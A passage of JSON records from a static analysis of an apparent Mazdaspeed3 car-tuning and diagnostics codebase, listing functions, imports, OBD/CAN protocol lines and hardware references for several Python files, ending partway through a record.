{"file_path": "elm327_gui.py", "lines_read": 1434, "features_found": [{"type": "function", "name": "__init__", "line": 77}, {"type": "function", "name": "discover_devices", "line": 87}, {"type": "function", "name": "connect_to_device", "line": 100}, {"type": "function", "name": "disconnect", "line": 128}, {"type": "function", "name": "send_command", "line": 136}, {"type": "function", "name": "read_response", "line": 145}, {"type": "function", "name": "parse_obd_response", "line": 162}, {"type": "function", "name": "start_monitoring", "line": 181}, {"type": "function", "name": "run", "line": 187}, {"type": "function", "name": "read_dtcs", "line": 207}, {"type": "function", "name": "parse_dtc_codes", "line": 216}, {"type": "function", "name": "hex_to_dtc", "line": 233}, {"type": "function", "name": "clear_dtcs", "line": 260}, {"type": "function", "name": "start_logging", "line": 265}, {"type": "function", "name": "stop_logging", "line": 277}, {"type": "function", "name": "__init__", "line": 287}, {"type": "function", "name": "add_training_point", "line": 294}, {"type": "function", "name": "train_model", "line": 302}, {"type": "function", "name": "predict_optimal_timing", "line": 330}, {"type": "function", "name": "save_model", "line": 348}, {"type": "function", "name": "load_model", "line": 362}, {"type": "function", "name": "__init__", "line": 377}, {"type": "function", "name": "_create_boost_map", "line": 392}, {"type": "function", "name": "_create_timing_map", "line": 409}, {"type": "function", "name": "__init__", "line": 435}, {"type": "function", "name": "calculate_engine_torque", "line": 444}, {"type": "function", "name": "_get_base_torque", "line": 450}, {"type": "function", "name": "__init__", "line": 462}, {"type": "function", "name": "read_knock_data", "line": 471}, {"type": "function", "name": "read_wastegate_duty", "line": 477}, {"type": "function", "name": "parse_enhanced_response", "line": 483}, {"type": "function", "name": "__init__", "line": 497}, {"type": "function", "name": "set_value", "line": 507}, {"type": "function", "name": "paintEvent", "line": 512}, {"type": "function", "name": "__init__", "line": 541}, {"type": "function", "name": "add_data_point", "line": 549}, {"type": "function", "name": "paintEvent", "line": 556}, {"type": "function", "name": "__init__", "line": 590}, {"type": "function", "name": "setup_ui", "line": 596}, {"type": "function", "name": "setup_1d_map", "line": 624}, {"type": "function", "name": "setup_2d_map", "line": 636}, {"type": "function", "name": "adjust_map_globally", "line": 654}, {"type": "function", "name": "__init__", "line": 666}, {"type": "function", "name": "setup_ui", "line": 673}, {"type": "function", "name": "setup_dashboard_tab", "line": 702}, {"type": "function", "name": "setup_diagnostics_tab", "line": 768}, {"type": "function", "name": "setup_tuning_tab", "line": 796}, {"type": "function", "name": "setup_logging_tab", "line": 832}, {"type": "function", "name": "setup_connection_tab", "line": 875}, {"type": "function", "name": "connect_signals", "line": 906}, {"type": "function", "name": "scan_devices", "line": 922}, {"type": "function", "name": "connect_to_device", "line": 928}, {"type": "function", "name": "disconnect_device", "line": 943}, {"type": "function", "name": "on_data_received", "line": 946}, {"type": "function", "name": "check_alerts", "line": 966}, {"type": "function", "name": "add_alert", "line": 978}, {"type": "function", "name": "on_connection_status", "line": 984}, {"type": "function", "name": "on_dtc_received", "line": 988}, {"type": "function", "name": "get_dtc_description", "line": 997}, {"type": "function", "name": "on_raw_data", "line": 1005}, {"type": "function", "name": "read_dtcs", "line": 1011}, {"type": "function", "name": "clear_dtcs", "line": 1014}, {"type": "function", "name": "start_logging", "line": 1022}, {"type": "function", "name": "stop_logging", "line": 1029}, {"type": "function", "name": "__init__", "line": 1037}, {"type": "function", "name": "setup_ui", "line": 1045}, {"type": "function", "name": "setup_advanced_tuning_tab", "line": 1060}, {"type": "function", "name": "setup_ai_tuner_tab", "line": 1126}, {"type": "function", "name": "setup_virtual_dyno_tab", "line": 1184}, {"type": "function", "name": "change_boost_map", "line": 1210}, {"type": "function", "name": "change_timing_map", "line": 1218}, {"type": "function", "name": "start_ai_training", "line": 1226}, {"type": "function", "name": "train_ai_model", "line": 1231}, {"type": "function", "name": "save_ai_model", "line": 1238}, {"type": "function", "name": "load_ai_model", "line": 1246}, {"type": "function", "name": "get_ai_recommendation", "line": 1257}, {"type": "function", "name": "run_dyno_simulation", "line": 1294}, {"type": "function", "name": "simulate_quarter_mile", "line": 1326}, {"type": "function", "name": "on_data_received", "line": 1361}, {"type": "function", "name": "read_enhanced_parameters", "line": 1376}, {"type": "function", "name": "collect_training_data", "line": 1389}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.preprocessing", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "serial.tools.list_ports", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "csv", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "math", "line": null}, {"type": "import", "module": "pickle", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "(QApplication,", "line": null}, {"type": "import", "module": "Qt,", "line": null}, {"type": "import", "module": "QFont,", "line": null}, {"type": "import", "module": "sklearn,", "line": null}, {"type": "import", "module": "RandomForestRegressor", "line": null}, {"type": "import", "module": "StandardScaler", "line": null}], "components_found": [{"type": "class", "name": "ELM327Commands", "line": 34}, {"type": "class", "name": "Mazdaspeed3PIDs", "line": 56}, {"type": "class", "name": "ELM327Interface", "line": 71}, {"type": "class", "name": "AITuner", "line": 286}, {"type": "class", "name": "AdvancedTuningMaps", "line": 376}, {"type": "class", "name": "VirtualDyno", "line": 434}, {"type": "class", "name": "EnhancedELM327Interface", "line": 461}, {"type": "class", "name": "RealTimeGauge", "line": 494}, {"type": "class", "name": "DataGraphWidget", "line": 540}, {"type": "class", "name": "TuningMapWidget", "line": 589}, {"type": "class", "name": "MazdaspeedTunerGUI", "line": 665}, {"type": "class", "name": "EnhancedMazdaspeedTunerGUI", "line": 1036}], "algorithms": [{"type": "algorithm_function", "line": 444, "content": "def calculate_engine_torque(self, rpm, boost, timing):"}], "protocols": [{"type": "protocol", "line": 56, "protocol": "PID", "content": "class Mazdaspeed3PIDs:"}, {"type": "protocol", "line": 58, "protocol": "PID", "content": "PID_DEFINITIONS = {"}, {"type": "protocol", "line": 92, "protocol": "OBD", "content": "if any(name in port.description.upper() for name in ['OBD', 'ELM327', 'VAG', 'BLUETOOTH']):"}, {"type": "protocol", "line": 163, "protocol": "OBD", "content": "\"\"\"Parse OBD-II response and convert to actual value\"\"\""}, {"type": "protocol", "line": 171, "protocol": "PID", "content": "if pid in Mazdaspeed3PIDs.PID_DEFINITIONS:"}, {"type": "protocol", "line": 172, "protocol": "PID", "content": "formula = Mazdaspeed3PIDs.PID_DEFINITIONS[pid][\"formula\"]"}, {"type": "protocol", "line": 178, "protocol": "PID", "content": "print(f\"Parse error for PID {pid}: {e}\")"}, {"type": "protocol", "line": 182, "protocol": "PID", "content": "\"\"\"Start monitoring specified PIDs\"\"\""}, {"type": "protocol", "line": 198, "protocol": "PID", "content": "pid_name = Mazdaspeed3PIDs.PID_DEFINITIONS.get(pid, {}).get(\"name\", pid)"}], "hardware_assumptions": [{"type": "hardware", "line": 62, "hardware": "vehicle", "content": "\"010D\": {\"name\": \"Vehicle Speed\", \"units\": \"km/h\", \"formula\": lambda x: x},"}, {"type": "hardware", "line": 436, "hardware": "vehicle", "content": "self.vehicle_mass = 1500"}, {"type": "hardware", "line": 677, "hardware": "ABS", "content": "self.tabs = QTabWidget()"}, {"type": "hardware", "line": 678, "hardware": "ABS", "content": "self.setCentralWidget(self.tabs)"}, {"type": "hardware", "line": 686, "hardware": "ABS", "content": "self.tabs.addTab(self.dashboard_tab, \"Live Dashboard\")"}, {"type": "hardware", "line": 687, "hardware": "ABS", "content": "self.tabs.addTab(self.diagnostics_tab, \"Diagnostics\")"}, {"type": "hardware", "line": 688, "hardware": "ABS", "content": "self.tabs.addTab(self.tuning_tab, \"Performance Tuning\")"}, {"type": "hardware", "line": 689, "hardware": "ABS", "content": "self.tabs.addTab(self.logging_tab, \"Data Logging\")"}, {"type": "hardware", "line": 690, "hardware": "ABS", "content": "self.tabs.addTab(self.connection_tab, \"Connection\")"}, {"type": "hardware", "line": 954, "hardware": "vehicle", "content": "elif parameter == \"Vehicle Speed\":"}, {"type": "hardware", "line": 1052, "hardware": "ABS", "content": "self.tabs.addTab(self.advanced_tuning_tab, \"Advanced Tuning\")"}, {"type": "hardware", "line": 1053, "hardware": "ABS", "content": "self.tabs.addTab(self.ai_tuner_tab, \"AI Tuner\")"}, {"type": "hardware", "line": 1054, "hardware": "ABS", "content": "self.tabs.addTab(self.virtual_dyno_tab, \"Virtual Dyno\")"}, {"type": "hardware", "line": 1080, "hardware": "ABS", "content": "maps_tabs = QTabWidget()"}, {"type": "hardware", "line": 1086, "hardware": "ABS", "content": "maps_tabs.addTab(self.boost_map_widget, \"Boost\")"}, {"type": "hardware", "line": 1092, "hardware": "ABS", "content": "maps_tabs.addTab(self.timing_map_widget, \"Timing\")"}, {"type": "hardware", "line": 1094, "hardware": "ABS", "content": "layout.addWidget(maps_tabs)"}, {"type": "hardware", "line": 1288, "hardware": "ABS", "content": "if abs(optimal_timing - current_timing) > 0.5:"}, {"type": "hardware", "line": 1351, "hardware": "vehicle", "content": "results += \"Excellent - Highly tuned vehicle\""}, {"type": "hardware", "line": 1357, "hardware": "vehicle", "content": "results += \"Below average - Check vehicle health\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "example_telemetry_usage.py", "lines_read": 153, "features_found": [{"type": "function", "name": "signal_handler", "line": 14}, {"type": "function", "name": "setup_can_bus", "line": 23}, {"type": "function", "name": "display_metrics", "line": 85}, {"type": "function", "name": "main", "line": 119}, {"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "recv", "line": 41}, {"type": "function", "name": "shutdown", "line": 80}, {"type": "import", "module": "RealTimeTelemetry", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "signal", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "RealTimeTelemetry,", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "can", "line": null}], "components_found": [{"type": "class", "name": "MockCANBus", "line": 36}], "algorithms": [], "protocols": [{"type": "protocol", "line": 12, "protocol": "CAN", "content": "from RealTimeTelemetry import RealTimeTelemetry, CAN_ID"}, {"type": "protocol", "line": 24, "protocol": "CAN", "content": "\"\"\"Set up and return a CAN bus interface.\"\"\""}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "print(\"Attempting to connect to CAN bus...\")"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "print(\"Connected to CAN bus\")"}, {"type": "protocol", "line": 32, "protocol": "CAN", "content": "print(f\"Could not connect to CAN bus: {e}\")"}, {"type": "protocol", "line": 33, "protocol": "CAN", "content": "print(\"Using a mock CAN bus for demonstration...\")"}, {"type": "protocol", "line": 36, "protocol": "CAN", "content": "class MockCANBus:"}, {"type": "protocol", "line": 58, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.ENGINE_RPM.value, data=data)"}, {"type": "protocol", "line": 63, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.BOOST_PRESSURE.value, data=data)"}, {"type": "protocol", "line": 68, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.AIR_FUEL_RATIO.value, data=data)"}, {"type": "protocol", "line": 73, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.IGNITION_TIMING.value, data=data)"}, {"type": "protocol", "line": 78, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.COOLANT_TEMP.value, data=data)"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "return MockCANBus()"}], "hardware_assumptions": [{"type": "hardware", "line": 6, "hardware": "vehicle", "content": "and display vehicle telemetry data in real-time."}, {"type": "hardware", "line": 24, "hardware": "CAN bus", "content": "\"\"\"Set up and return a CAN bus interface.\"\"\""}, {"type": "hardware", "line": 27, "hardware": "CAN bus", "content": "print(\"Attempting to connect to CAN bus...\")"}, {"type": "hardware", "line": 29, "hardware": "CAN bus", "content": "print(\"Connected to CAN bus\")"}, {"type": "hardware", "line": 32, "hardware": "CAN bus", "content": "print(f\"Could not connect to CAN bus: {e}\")"}, {"type": "hardware", "line": 33, "hardware": "CAN bus", "content": "print(\"Using a mock CAN bus for demonstration...\")"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "print(\"=== Real-Time Vehicle Telemetry ===\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "fix_platforms.py", "lines_read": 308, "features_found": [{"type": "function", "name": "main", "line": 252}, {"type": "function", "name": "__init__", "line": 20}, {"type": "function", "name": "fix_relative_imports", "line": 24}, {"type": "function", "name": "fix_missing_core_imports", "line": 45}, {"type": "function", "name": "fix_syntax_errors", "line": 61}, {"type": "function", "name": "add_standard_imports", "line": 84}, {"type": "function", "name": "fix_file", "line": 120}, {"type": "function", "name": "fix_priority_files", "line": 174}, {"type": "function", "name": "fix_key_platforms", "line": 212}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "core", "line": null}, {"type": "import", "module": "utils", "line": null}, {"type": "import", "module": "gui", "line": null}, {"type": "import", "module": "muts", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "re", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "patterns", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator',", "line": null}, {"type": "import", "module": "get_logger'", "line": null}, {"type": "import", "module": "')", "line": null}, {"type": "import", "module": "')", "line": null}, {"type": "import", "module": "issues\")", "line": null}], "components_found": [{"type": "class", "name": "PlatformFixer", "line": 17}], "algorithms": [], "protocols": [{"type": "protocol", "line": 89, "protocol": "CAN", "content": "if ('ECU' in content or 'ecu' in content or 'CAN' in content or 'can' in content) and \\"}], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ABS", "content": "\"\"\"Fix relative imports to absolute imports\"\"\""}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "content = re.sub(r'from\\s+core\\.diagnostic_protocols', 'from core.ecu_communication', content)"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "\"\"\"Add standard imports for ECU communication files\"\"\""}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "if ('ECU' in content or 'ecu' in content or 'CAN' in content or 'can' in content) and \\"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "'from core.ecu_communication import' not in content:"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "'from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState',"}], "security_logic": [{"type": "security_pattern", "line": 212, "pattern": "key", "content": "def fix_key_platforms(self) -> Dict[str, any]:"}, {"type": "security_pattern", "line": 213, "pattern": "key", "content": "\"\"\"Fix key platform files (versa, cobb, mds)\"\"\""}, {"type": "security_pattern", "line": 214, "pattern": "key", "content": "print(\"\\n=== FIXING KEY PLATFORM FILES ===\\n\")"}, {"type": "security_pattern", "line": 216, "pattern": "key", "content": "key_platforms = {"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "for platform, files in key_platforms.items():"}, {"type": "security_pattern", "line": 246, "pattern": "key", "content": "'total_files': sum(len(files) for files in key_platforms.values()),"}, {"type": "security_pattern", "line": 267, "pattern": "key", "content": "key_results = fixer.fix_key_platforms()"}, {"type": "security_pattern", "line": 269, "pattern": "key", "content": "print(f\"\\n=== KEY PLATFORMS RESULTS ===\")"}, {"type": "security_pattern", "line": 270, "pattern": "key", "content": "print(f\"Files processed: {key_results['total_files']}\")"}, {"type": "security_pattern", "line": 271, "pattern": "key", "content": "print(f\"Files fixed: {key_results['files_fixed']}\")"}, {"type": "security_pattern", "line": 272, "pattern": "key", "content": "print(f\"Total fixes applied: {key_results['total_fixes']}\")"}, {"type": "security_pattern", "line": 293, "pattern": "key", "content": "print(f\"Total files processed: {priority_results['total_files'] + key_results['total_files']}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "gui/main_window.py", "lines_read": 774, "features_found": [{"type": "function", "name": "main", "line": 753}, {"type": "function", "name": "__init__", "line": 54}, {"type": "function", "name": "run", "line": 59}, {"type": "function", "name": "stop", "line": 80}, {"type": "function", "name": "__init__", "line": 86}, {"type": "function", "name": "init_ui", "line": 91}, {"type": "function", "name": "update_gauges", "line": 173}, {"type": "function", "name": "update_status", "line": 188}, {"type": "function", "name": "connect_ecu", "line": 225}, {"type": "function", "name": "disconnect_ecu", "line": 234}, {"type": "function", "name": "read_vin", "line": 243}, {"type": "function", "name": "__init__", "line": 254}, {"type": "function", "name": "init_ui", "line": 259}, {"type": "function", "name": "load_current_values", "line": 339}, {"type": "function", "name": "change_performance_mode", "line": 357}, {"type": "function", "name": "update_boost_target", "line": 367}, {"type": "function", "name": "update_timing_base", "line": 374}, {"type": "function", "name": "update_afr_target", "line": 381}, {"type": "function", "name": "update_rev_limit", "line": 388}, {"type": "function", "name": "apply_tuning_changes", "line": 395}, {"type": "function", "name": "reset_to_stock", "line": 405}, {"type": "function", "name": "save_tune", "line": 420}, {"type": "function", "name": "__init__", "line": 435}, {"type": "function", "name": "init_ui", "line": 440}, {"type": "function", "name": "read_dtcs", "line": 492}, {"type": "function", "name": "clear_dtcs", "line": 503}, {"type": "function", "name": "start_live_data", "line": 518}, {"type": "function", "name": "stop_live_data", "line": 528}, {"type": "function", "name": "__init__", "line": 541}, {"type": "function", "name": "init_ui", "line": 552}, {"type": "function", "name": "create_menu_bar", "line": 642}, {"type": "function", "name": "setup_data_updates", "line": 681}, {"type": "function", "name": "on_state_change", "line": 687}, {"type": "function", "name": "on_ecu_data_update", "line": 696}, {"type": "function", "name": "open_tune", "line": 704}, {"type": "function", "name": "save_tune", "line": 716}, {"type": "function", "name": "show_about", "line": 728}, {"type": "function", "name": "closeEvent", "line": 735}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "QTimer,", "line": null}, {"type": "import", "module": "QFont,", "line": null}, {"type": "import", "module": "get_app_state,", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [{"type": "class", "name": "GUIState", "line": 32}, {"type": "class", "name": "PlatformConfig", "line": 42}, {"type": "class", "name": "DataUpdateThread", "line": 50}, {"type": "class", "name": "DashboardTab", "line": 83}, {"type": "class", "name": "TuningTab", "line": 251}, {"type": "class", "name": "DiagnosticsTab", "line": 432}, {"type": "class", "name": "MUTSMainWindow", "line": 538}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 27, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "ecu_data = self.app_state.get_ecu_data()"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "'engine_rpm': ecu_data.engine_rpm,"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "'boost_psi': ecu_data.boost_psi,"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "'ignition_timing': ecu_data.ignition_timing,"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "'afr': ecu_data.afr,"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "'coolant_temp': ecu_data.coolant_temp,"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "'throttle_position': ecu_data.throttle_position,"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "'vehicle_speed': ecu_data.vehicle_speed,"}, {"type": "hardware", "line": 72, "hardware": "vehicle", "content": "'vehicle_speed': ecu_data.vehicle_speed,"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "'timestamp': ecu_data.timestamp"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "self.connection_label = QLabel(\"ECU: Disconnected\")"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "self.connect_btn = QPushButton(\"Connect ECU\")"}, {"type": "hardware", "line": 155, "hardware": "ECU", "content": "self.connect_btn.clicked.connect(self.connect_ecu)"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "self.disconnect_btn.clicked.connect(self.disconnect_ecu)"}, {"type": "hardware", "line": 181, "hardware": "ECU", "content": "ecu_data = self.app_state.get_ecu_data()"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "self.coolant_label.setText(f\"Coolant: {ecu_data.coolant_temp:.1f}\u00b0C\")"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "self.throttle_label.setText(f\"Throttle: {ecu_data.throttle_position:.1f}%\")"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "conn_text = \"ECU: Connected\" if status.ecu_connected else \"ECU: Disconnected\""}, {"type": "hardware", "line": 210, "hardware": "ECU", "content": "conn_color = \"green\" if status.ecu_connected else \"red\""}, {"type": "hardware", "line": 218, "hardware": "ECU", "content": "self.connect_btn.setEnabled(not status.ecu_connected)"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "self.disconnect_btn.setEnabled(status.ecu_connected)"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "self.read_vin_btn.setEnabled(status.ecu_connected)"}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "def connect_ecu(self):"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "\"\"\"Connect to ECU\"\"\""}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "logger.info(\"ECU connection initiated\")"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "logger.error(f\"Error connecting ECU: {e}\")"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "def disconnect_ecu(self):"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "self.app_state.update_system_status(ecu_connected=False)"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "logger.info(\"ECU disconnected\")"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "logger.error(f\"Error disconnecting ECU: {e}\")"}, {"type": "hardware", "line": 244, "hardware": "vehicle", "content": "\"\"\"Read vehicle VIN\"\"\""}, {"type": "hardware", "line": 550, "hardware": "ECU", "content": "self.app_state.register_callback('ecu_data_update', self.on_ecu_data_update)"}, {"type": "hardware", "line": 666, "hardware": "ECU", "content": "connect_action = QAction(\"Connect ECU\", self)"}, {"type": "hardware", "line": 667, "hardware": "ECU", "content": "connect_action.triggered.connect(self.dashboard_tab.connect_ecu)"}, {"type": "hardware", "line": 670, "hardware": "ECU", "content": "disconnect_action = QAction(\"Disconnect ECU\", self)"}, {"type": "hardware", "line": 671, "hardware": "ECU", "content": "disconnect_action.triggered.connect(self.dashboard_tab.disconnect_ecu)"}, {"type": "hardware", "line": 696, "hardware": "ECU", "content": "def on_ecu_data_update(self, data):"}, {"type": "hardware", "line": 697, "hardware": "ECU", "content": "\"\"\"Handle ECU data updates\"\"\""}, {"type": "hardware", "line": 702, "hardware": "ECU", "content": "logger.error(f\"Error handling ECU data update: {e}\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "hardware_factory.py", "lines_read": 215, "features_found": [{"type": "function", "name": "get_factory", "line": 190}, {"type": "function", "name": "create_default_hardware", "line": 198}, {"type": "function", "name": "__init__", "line": 41}, {"type": "function", "name": "get_available_backends", "line": 46}, {"type": "function", "name": "create_can_engine", "line": 65}, {"type": "function", "name": "create_obd_service", "line": 92}, {"type": "function", "name": "create_hardware_pair", "line": 119}, {"type": "function", "name": "auto_detect_hardware", "line": 139}, {"type": "function", "name": "validate_backend_compatibility", "line": 168}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "mazda_can_engine", "line": null}, {"type": "import", "module": "mazda_obd_service", "line": null}, {"type": "import", "module": "python_can_engine", "line": null}, {"type": "import", "module": "j2534_can_engine", "line": null}, {"type": "import", "module": "python_obd_service", "line": null}, {"type": "import", "module": "j2534_obd_service", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "MazdaCANEngine,", "line": null}, {"type": "import", "module": "MazdaOBDService,", "line": null}, {"type": "import", "module": "PythonCANEngine", "line": null}, {"type": "import", "module": "J2534CANEngine", "line": null}, {"type": "import", "module": "PythonOBDService", "line": null}, {"type": "import", "module": "J2534OBDService", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "j2534", "line": null}], "components_found": [{"type": "class", "name": "HardwareBackend", "line": 18}, {"type": "class", "name": "HardwareFactory", "line": 24}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "CAN", "content": "Provides pluggable backends for CAN and OBD communication devices."}, {"type": "protocol", "line": 3, "protocol": "OBD", "content": "Provides pluggable backends for CAN and OBD communication devices."}, {"type": "protocol", "line": 10, "protocol": "CAN", "content": "from mazda_can_engine import MazdaCANEngine, CANInterfaceType"}, {"type": "protocol", "line": 11, "protocol": "OBD", "content": "from mazda_obd_service import MazdaOBDService, OBDCommandMode"}, {"type": "protocol", "line": 12, "protocol": "CAN", "content": "from python_can_engine import PythonCANEngine"}, {"type": "protocol", "line": 13, "protocol": "CAN", "content": "from j2534_can_engine import J2534CANEngine"}, {"type": "protocol", "line": 13, "protocol": "J2534", "content": "from j2534_can_engine import J2534CANEngine"}, {"type": "protocol", "line": 14, "protocol": "OBD", "content": "from python_obd_service import PythonOBDService"}, {"type": "protocol", "line": 15, "protocol": "OBD", "content": "from j2534_obd_service import J2534OBDService"}, {"type": "protocol", "line": 15, "protocol": "J2534", "content": "from j2534_obd_service import J2534OBDService"}, {"type": "protocol", "line": 20, "protocol": "CAN", "content": "PYTHON_CAN = \"python-can\""}, {"type": "protocol", "line": 21, "protocol": "J2534", "content": "J2534_PASSTHRU = \"j2534-passthru\""}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "Factory for creating hardware-specific CAN and OBD implementations."}, {"type": "protocol", "line": 26, "protocol": "OBD", "content": "Factory for creating hardware-specific CAN and OBD implementations."}, {"type": "protocol", "line": 31, "protocol": "CAN", "content": "CAN_BACKENDS = {"}, {"type": "protocol", "line": 32, "protocol": "CAN", "content": "HardwareBackend.PYTHON_CAN: PythonCANEngine,"}, {"type": "protocol", "line": 33, "protocol": "CAN", "content": "HardwareBackend.J2534_PASSTHRU: J2534CANEngine,"}, {"type": "protocol", "line": 33, "protocol": "J2534", "content": "HardwareBackend.J2534_PASSTHRU: J2534CANEngine,"}, {"type": "protocol", "line": 36, "protocol": "OBD", "content": "OBD_BACKENDS = {"}, {"type": "protocol", "line": 37, "protocol": "CAN", "content": "HardwareBackend.PYTHON_CAN: PythonOBDService,"}, {"type": "protocol", "line": 37, "protocol": "OBD", "content": "HardwareBackend.PYTHON_CAN: PythonOBDService,"}, {"type": "protocol", "line": 38, "protocol": "OBD", "content": "HardwareBackend.J2534_PASSTHRU: J2534OBDService,"}, {"type": "protocol", "line": 38, "protocol": "J2534", "content": "HardwareBackend.J2534_PASSTHRU: J2534OBDService,"}, {"type": "protocol", "line": 54, "protocol": "CAN", "content": "for backend, cls in HardwareFactory.CAN_BACKENDS.items()"}, {"type": "protocol", "line": 61, "protocol": "OBD", "content": "for backend, cls in HardwareFactory.OBD_BACKENDS.items()"}, {"type": "protocol", "line": 67, "protocol": "CAN", "content": "config: Optional[Dict[str, Any]] = None) -> MazdaCANEngine:"}, {"type": "protocol", "line": 69, "protocol": "CAN", "content": "Create CAN engine with specified backend."}, {"type": "protocol", "line": 76, "protocol": "CAN", "content": "Configured CAN engine instance"}, {"type": "protocol", "line": 78, "protocol": "CAN", "content": "if backend not in self.CAN_BACKENDS:"}, {"type": "protocol", "line": 79, "protocol": "CAN", "content": "raise ValueError(f\"Unsupported CAN backend: {backend.value}\")"}, {"type": "protocol", "line": 82, "protocol": "CAN", "content": "engine_class = self.CAN_BACKENDS[backend]"}, {"type": "protocol", "line": 85, "protocol": "CAN", "content": "self.logger.info(f\"Created CAN engine with {backend.value} backend\")"}, {"type": "protocol", "line": 89, "protocol": "CAN", "content": "self.logger.error(f\"Failed to create CAN engine with {backend.value}: {e}\")"}, {"type": "protocol", "line": 94, "protocol": "OBD", "content": "config: Optional[Dict[str, Any]] = None) -> MazdaOBDService:"}, {"type": "protocol", "line": 96, "protocol": "OBD", "content": "Create OBD service with specified backend."}, {"type": "protocol", "line": 103, "protocol": "OBD", "content": 